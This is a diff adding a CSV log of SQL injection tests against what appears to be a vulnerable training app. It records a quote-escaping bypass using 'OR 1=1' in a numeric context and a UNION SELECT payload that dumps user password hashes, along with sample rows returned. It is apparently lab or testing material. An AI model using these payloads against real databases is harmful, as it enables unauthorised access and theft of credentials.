@@ -1,0 +1,5 @@
+payload,role,rows_returned,confirmed,note,sample
+1,baseline,1,,single-id lookup: exactly one user expected,"[('admin', 'admin')]"
+1' OR '1'='1,naive (quote),0,False,Medium runs mysql_real_escape_string -> the quote is escaped,[]
+1 OR 1=1,bypass (numeric),5,True,no quote needed; escaping is a no-op on numeric context,"[('admin', 'admin'), ('Gordon', 'Brown'), ('Hack', 'Me')]"
+"1 OR 1=1 UNION SELECT user, password FROM users -- -",bypass (union dump),10,True,dumps every user's password hash,"[('admin', 'admin'), ('Gordon', 'Brown'), ('Hack', 'Me')]"
